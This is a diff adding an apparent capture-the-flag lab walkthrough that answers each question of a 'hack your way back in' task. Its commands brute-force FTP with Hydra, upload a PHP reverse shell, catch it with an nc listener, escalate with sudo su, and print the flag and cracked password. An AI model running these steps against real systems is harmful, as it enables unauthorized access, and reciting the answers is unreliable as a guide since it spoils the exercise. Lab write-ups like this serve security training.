@@ -1,0 +1,35 @@
+
+								Task 2 Hack your way back into the machine 
+							-------------------------------------------------------------
+
+1. The attacker has changed the user's password! Can you replicate the attacker's steps and read the flag.txt? 
+   The flag is located in the /root/Reptile directory. Remember, you can always look back at the .pcap file if necessary. Good luck!
+ans: auto-complete
+
+2. Run Hydra (or any similar tool) on the FTP service. The attacker might not have chosen a complex password. You might get lucky if you use a common word list.
+ans: auto-complete (password is 987654321)
+command: hydra -l jenny -P /usr/share/wordlists/rockyou.txt -u ftp://10.10.200.111
+
+3. Change the necessary values inside the web shell and upload it to the webserver
+ans: auto-complete
+command: ftp 10.10.200.111 (jenny:987654321)
+command: lcd /tmp (your reverse-shell file location)
+command: put php_main_reverse_shell.php (your file name)
+command: chmod 777 php_main_reverse_shell.php
+command: exit
+
+4. Create a listener on the designated port on your attacker machine. Execute the web shell by visiting the .php file on the targeted web server.
+ans: auto-complete
+command: nc -nvlp 8000 (same as in the reverse-shell) (second terminal)
+command: curl 10.10.200.111/php_main_reverse_shell.php (your file name)
+
+5. Become root!
+ans: auto-complete
+command: python3 -c 'import pty; pty.spawn("/bin/bash")' (in nc -nvlp terminal)
+command: sudo -l (all:(all:all))
+command: sudo su (no password requird)
+
+6. Read the flag.txt file inside the Reptile directory
+ans: ebcefd66ca4b559d17b440b6e67fd0fd
+command: cat /root/Reptile/flag.txt
+
